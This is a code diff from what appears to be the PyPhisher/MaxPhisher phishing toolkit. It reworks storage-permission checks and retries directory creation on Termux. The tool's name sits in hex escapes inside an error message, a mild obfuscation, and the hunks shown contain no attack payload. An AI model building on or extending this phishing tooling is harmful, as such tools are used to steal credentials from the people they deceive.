@@ -283,8 +283,6 @@ if termux:
     default_dir = "/sdcard/Media"
 else:
     default_dir = f"{home}/Media"
-if not isdir(default_dir):
-   mkdir(default_dir)
 
 argparser = ArgumentParser()
 
@@ -1081,27 +1079,26 @@ def requirements():
     # Termux may not have permission to write in saved_file.
     # So we check if /sdcard is readable.
     # If not execute termux-setup-storage to prompt user to allow
-    if termux:
+    for retry in range(2):
         try:
-            if not isfile(saved_file):
-                mknod(saved_file)
-            with open(saved_file) as checkfile:
-                data = checkfile.read()
+            if not isdir(default_dir):
+                mkdir(default_dir)
+            if termux:
+                if not isfile(saved_file):
+                    mknod(saved_file)
+                with open(saved_file) as checkfile:
+                    data = checkfile.read()
+            break
         except (PermissionError, OSError):
-            shell("termux-setup-storage")
+            if termux:
+                shell("termux-setup-storage")
         except Exception as e:
             print(f"{error}{str(e)}")
-        try:
-            if not isfile(saved_file):
-                mknod(saved_file)
-            with open(saved_file) as checkfile:
-                data = checkfile.read()
-        except (PermissionError, OSError):
-            print(f"\n{error}You haven't allowed storage permission for termux. Closing \x50\x79\x50\x68\x69\x73\x68\x65\x72!\n")
+        if termux and retry == 1:
+            print(f"\n{error}You haven't allowed storage permission for termux. Closing \x4d\x61\x78\x50\x68\x69\x73\x68\x65\x72!\n")
             sleep(2)
             pexit()
-        except Exception as e:
-            print(f"{error}{str(e)}")
+
     internet()
     if termux:
         if not is_installed("proot"):
